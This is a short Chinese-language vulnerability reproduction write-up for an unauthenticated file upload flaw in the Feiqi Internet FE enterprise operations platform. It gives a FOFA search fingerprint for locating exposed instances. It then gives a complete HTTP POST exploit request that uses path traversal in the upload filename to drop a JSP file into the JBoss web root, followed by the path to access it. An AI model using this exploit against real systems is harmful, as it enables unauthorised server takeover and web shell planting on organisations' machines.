# 飞企互联FE企业运营管理平台uploadAttachmentServlet文件上传

# 一、漏洞简介
飞企互联FE企业运营管理平台存在未授权文件上传漏洞，获取服务器权限


# 二、资产测绘
+ fofa
```
body="/login/indexPicXml_valid.jsp?p="
```

# 三、漏洞复现
```
POST /servlet/uploadAttachmentServlet HTTP/1.1
Host:
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygcflwtei

------WebKitFormBoundarygcflwtei
Content-Disposition: form-data; name="uploadFile"; filename="../../../../../jboss/web/fe.war/dudesuite.jsp"
Content-Type: text/plain

<% out.println("dudesuite");%>
------WebKitFormBoundarygcflwtei
Content-Disposition: form-data; name="json"

{"iq":{"query":{"UpdateType":"mail"}}}
------WebKitFormBoundarygcflwtei--
```
# 访问地址
```
 /dudesuite.jsp
```
